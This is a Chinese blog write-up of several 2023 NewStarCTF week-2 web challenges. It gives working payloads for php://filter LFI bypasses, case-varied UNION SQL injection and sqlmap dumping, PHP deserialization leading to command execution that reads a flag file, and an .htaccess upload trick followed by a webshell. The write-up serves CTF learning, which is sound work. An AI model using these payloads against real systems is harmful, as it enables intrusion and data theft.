style="font-size: 1.05rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">20</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/" itemprop="url">Writeup</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/wp/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>wp</span></a></span></div></div><h1 class="post-title" itemprop="name headline">2023-NewstarCTF-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-13T10:41:32.000Z" title="发表于 2024-05-13 18:41:32">2024-05-13</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-15T02:50:18.693Z" title="更新于 2024-05-15 10:50:18">2024-05-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">19k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>92分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="2023-NewstarCTF-wp"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/05/13/2023-NewstarCTF-wp/"><header><a class="post-meta-categories" href="/categories/Writeup/" itemprop="url">Writeup</a><a href="/tags/wp/" tabindex="-1" itemprop="url">wp</a><h1 id="CrawlerTitle" itemprop="name headline">2023-NewstarCTF-wp</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-05-13T10:41:32.000Z" title="发表于 2024-05-13 18:41:32">2024-05-13</time><time itemprop="dateCreated datePublished" datetime="2024-05-15T02:50:18.693Z" title="更新于 2024-05-15 10:50:18">2024-05-15</time></header><h1 id="NEW-STAR-WEB"><a href="#NEW-STAR-WEB" class="headerlink" title="NEW STAR    WEB"></a>NEW STAR    WEB</h1><h2 id="week-2"><a href="#week-2" class="headerlink" title="week 2"></a>week 2</h2><h4 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa94520ca.png" alt="image-20240126151739468"></p>
<p>很明显不可能直接手打100000分</p>
<p>第一次碰到游戏题完全不会做 想了一会 直接give up</p>
<p>查看wp 复现如下：</p>
<p><strong>前端题  改javascript代码</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa948961e.png" alt="image-20240126155035820"></p>
<p>f12后在样式编辑器中可以找到js文件 发现游戏结束代码 346</p>
<p>这段代码的意思是：当分数高于100000时，向api.php发送post请求，弹窗你的分数并返回一个消息</p>
<p>所以我们需要改javascript的变量值，将gameScore赋值大于100000</p>
<p>方法:</p>
<ul>
<li><p>在我们需要修改的变量赋值语句之后，下断点（点击语句左侧的序号就能下断点），之后刷新页面（F5），重新载入页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9354beb.png" alt="image-20240126155827668"></p>
</li>
<li><p>换到 “控制台” 标签页，设置要修改的变量的值，达到覆盖原值的目的，语句格式 “变量名&#x3D;值”，gameScore&#x3D;999999</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa944de84.png" alt="image-20240126160001641"></p>
</li>
<li><p>上传后发现分数已经超了，自杀后，切回 “调试器” 标签页，变量值已被修改</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9303a7f.png" alt="image-20240126160542049"></p>
</li>
</ul>
<p>出flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa930abed.png" alt="image-20240126160600842"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa931d501.png" alt="image-20240126160613779"></p>
<h4 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure>

<p>禁用了base64与rot13</p>
<p>payload:</p>
<p>convert.iconv过滤器：</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa931588a.png" alt="image-20240126162458463"></p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;flag.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93e3924.png" alt="image-20240126162642873"></p>
<p>将+AHs-和+AH0删掉替换成{}，就是flag了</p>
<ol>
<li><code>convert.iconv</code>: 这是<code>libiconv</code>库的一个函数，用于字符编码转换。</li>
<li><code>utf-8.utf-7</code>: 这指定了要执行的转换。在这里，它试图将UTF-8编码转换为UTF-7编码。UTF-7并不是一个有效的或广泛使用的字符编码。</li>
</ol>
<p>3.<code>utf-8.utf-16le</code>:将数据从UTF-8编码转换为UTF-16LE编码</p>
<p><strong>这种转换通常不是攻击者的真正目的，而是利用这个过滤器来造成PHP解析文件内容时的混乱，从而泄露文件内容。实际上，这个转换过程可能会导致PHP输出文件内容的Base64编码或其他形式的编码，而不是直接输出转换后的字符</strong></p>
<p>同理：</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-2BE.UCS-2LE&#x2F;resource&#x3D;flag.php</p>
<p><code>convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-2BE.UCS-2LE</code>: 这是一个字符编码转换过滤器，尝试将文件内容从UCS-2LE编码转换为UCS-2BE编码，然后再转换回UCS-2LE编码。这样的转换通常不是为了实际的编码转换，而是为了造成PHP解析文件时的混乱，从而尝试获取文件内容。</p>
<p>其他可能:</p>
<p>rot13:     php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php</p>
<p>base64:    php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>toupper(转换为大写):   php:&#x2F;&#x2F;filter&#x2F;string.toupper&#x2F;resource&#x3D;flag.php</p>
<p>tolower(转换为小写):    php:&#x2F;&#x2F;filter&#x2F;string.tolower&#x2F;resource&#x3D;flag.php</p>
<h4 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93e2e58.png" alt="image-20240127010216221"></p>
<p>随便点开一个</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9461509.png" alt="image-20240127010253840"></p>
<p>发现url上有id的传参可能有注入点</p>
<p>另一个：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93d7890.png" alt="image-20240127010404429"></p>
<p>id不一样 应该是从这里来注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa92f034c.png" alt="image-20240127010500010"></p>
<p>%23：#   %27：‘</p>
<p>union select查一下 回显no 应该是有waf</p>
<p>大小写绕一下 可以了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9433119.png" alt="image-20240127010727025"></p>
<p>最开始的查表:</p>
<p>?id&#x3D;1’Union sElect 1,2,3,4,(grOup_conCat(taBle_nAme) froM inforMation_schEma.taBles wHEre taBle_scheMa&#x3D;dataBase())%23</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93b9353.png" alt="image-20240127012455153"></p>
<p>懵了 无回显 看了一下 感觉没什么问题啊</p>
<p>看来下wp</p>
<p>?id&#x3D;1’ uNion Select ((sElect grOup_cOncat(tAble_name) From infOrmation_schema.tables Where Table_schema&#x3D;Database())),2,3,4,5%23</p>
<p>为什么要加这个select 不太明白 以前做sql的题没遇见过啊 懵了 AI说这个select是不必要的 但是没有这个select有查不出来 服了 先放在这里吧 之后解决了在回来补上</p>
<p>加上select后</p>
<p>?id&#x3D;1’Union sElect 1,2,3,4,(sElect grOup_conCat(taBle_nAme) froM informatiOn_schEma.taBles wHEre taBle_scheMa&#x3D;dataBase())%23</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa940e752.png" alt="image-20240127013225646"></p>
<p>又懵了 这应该大小写问题 但我是每个单词都改了大小写的 一个一个对发现是information的问题 只有infOrmation和infoRmation可以 这是什么逻辑？双标狗</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa945209d.png" alt="image-20240127013733598"></p>
<p>查字段名：</p>
<p>?id&#x3D;1’union select 1,2,3,4,((sElect grOup_cOncat(cOlumn_nAme) From infOrmation_schEma.coLumns whEre tAble_nAme&#x3D;’here_is_flag’))%23</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9345d1a.png" alt="image-20240127014125897"></p>
<p>经典</p>
<p>?id&#x3D;1’ uNion Select ((sElect grOup_cOncat(column_name) From infOrmation_schema.columns Where Table_name&#x3D;’here_is_flag’)),2,3,4,5%23</p>
<p>不想管了 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa944541f.png" alt="image-20240127014522482"></p>
<p>查值：</p>
<p>id&#x3D;1’uNion Select 1,2,3,4,(sElect grOup_cOncat(flag) From ‘ here_is_flag’)%23</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa946f563.png" alt="image-20240127014941787"></p>
<p>sqlmap也可以 但是我没做起 报了个什么错 没搞懂</p>
<p>payload: 别人的结果</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://http//9dfeb06c-8482-4b4b-b5a9-ed3625a7e087.node5.buuoj.cn:81/%EF%BC%9Fid=1">http://http://9dfeb06c-8482-4b4b-b5a9-ed3625a7e087.node5.buuoj.cn:81/？id=1</a>‘ -D ‘ctf’ -T ‘here_is_flag’ -C ‘flag’  –dump   </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9a5e0e4.png" alt="image-20240127152916422"></p>
<p>sqlmap简单使用：</p>
<p>1、检测「注入点」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘<br>1<br>2、查看所有「数据库」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ –dbs<br>1<br>3、查看当前使用的数据库</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ –current-db<br>1<br>4、查看「数据表」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ –tables<br>1<br>5、查看「字段」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –tables<br>1<br>6、查看「数据」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –dump</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img-blog.csdnimg.cn/6d8451a8d3bb4340b96fb40218ee7138.png" alt="img"></p>
<p>post、UA等上的注入方法：</p>
<ul>
<li><p>找到注入点后 bp抓包 在注入点后加* 把整个包复制下来 保存</p>
</li>
<li><p>用-r来打开保存后的包</p>
</li>
</ul>
<h4 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>很多反序列化的知识已经忘了  过年的时候把笔记补上</p>
<p>__destruct()这是在对象被销毁时自动调用</p>
<ol>
<li>对象生命周期结束：当一个对象的生命周期结束时，例如脚本执行结束或对象不再被引用时，PHP 的垃圾回收机制会自动销毁该对象，并触发 <code>__destruct()</code> 方法。</li>
<li>对象被显式销毁：可以使用 <code>unset()</code> 函数显式销毁一个对象，这将触发 <code>__destruct()</code></li>
</ol>
<p>复现如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=(<span class="string">&#x27;ls -al&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    <span class="comment">//O:4:&quot;evil&quot;:1:&#123;s:9:&quot;evilcmd&quot;;s:6:&quot;ls -al&quot;;&#125; </span></span><br></pre></td></tr></table></figure>

<p>但是PHP 序列化的时候 private和 protected 变量会引入不可见字符%00，private是%00类名%00属性名 ，protected为%00*%00属性名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa930f256.png" alt="image-20240127161447216"></p>
<p>两个白空格就是</p>
<p>url编码后O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22***%00<em><strong>evil</strong></em>%00***cmd%22%3Bs%3A6%3A%22ls+-al%22%3B%7D </p>
<p>因为是private，序列化出来后会有%00属性导致无法完全复制去burp，而且传参里也不能有空格，应该用%20或者‘+’链接因为最后使用post传参可以识别url编码，所以把空格处替换为%20</p>
<p> O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:6:”ls%20-al”;} </p>
<p>直接查根目录  linux中查询根目录下文件的命令为ls &#x2F;    在上面的代码中将ls -al 改为ls &#x2F;</p>
<p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:4:”ls%20&#x2F;“;} </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa940f5c6.png" alt="image-20240127162542891"></p>
<p>发现flag文件 </p>
<p>禁用了cat|tac|more|tail|base </p>
<p>还可以用 head  nl  uniq</p>
<p>uniq &#x2F;th1s_1s_fffflllll4444aaaggggg</p>
<p>nl &#x2F;th1s_1s_fffflllll4444aaaggggg</p>
<p>head &#x2F;th1s_1s_fffflllll4444aaaggggg</p>
<p>直接序列化</p>
<p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:35:”head%20&#x2F;th1s_1s_fffflllll4444aaaggggg”;} </p>
<p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:33:”nl%20&#x2F;th1s_1s_fffflllll4444aaaggggg”;} </p>
<p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:35:”uniq%20&#x2F;th1s_1s_fffflllll4444aaaggggg”;} </p>
<p>也可以再url编码      echo urlencode(serialize($a));  这样就可以不加%00</p>
<p>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22head+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D </p>
<p>但是直接这样也不行  要把命令中的加号替换为%20或者空格</p>
<p>即：</p>
<p>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22head***%20***%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa942a707.png" alt="image-20240127164959219"></p>
<p>其他的同理即可</p>
<h4 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa98df36e.png" alt="image-20240127165514001"></p>
<p>真挺讨厌文件上传的</p>
<p>.htaccess</p>
<p>.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
<p>总之就是告诉服务器将 <code>.jpg</code> 后缀的文件解析为 PHP 脚本</p>
<p>AddType application&#x2F;x-httpd-php .jpg</p>
<p>将jpg用php解析</p>
<p>常见配置：</p>
<p>AddHandler php5-script .jpg</p>
<p>AddType application&#x2F;x-httpd-php .jpg</p>
<p>Sethandler application&#x2F;x-httpd-php<br>Sethandler 将该目录及子目录的所有文件均映射为php文件类型。<br>Addhandler 使用 php5-script 处理器来解析所匹配到的文件。<br>AddType 将特定扩展名文件映射为php文件类型。</p>
<p>先传配置文件   .htaccess  可以</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9a09e91.png" alt="image-20240127184547569"></p>
<p>再传图片马</p>
<p>?我传个没马的也给我过滤了？懵了 换了张图片也是这样 give up</p>
<p>这个应该是传了.htaccess后 再传图片马 然后蚁剑连接 根目录上找flag</p>
<p>找了wp就是这样</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9442d79.png" alt="image-20240127192240775"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa945cc67.png" alt="image-20240127192303247"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9458dfe.png" alt="image-20240127192313715"></p>
<p>本来文件上传和蚁剑就是我的弱项 你还给我整这出  </p>
<p>它过滤了&lt;?  只要有&lt;?就会被认为是php  所以要用javascript写来绕过&lt;?</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9ac5a14.png" alt="image-20240127233054341"></p>
<p>ok 这个上传上去了  不是用的图片马 而是直接改的后缀</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9465904.png" alt="image-20240127233320601"></p>
<p>好好好 终于进来了</p>
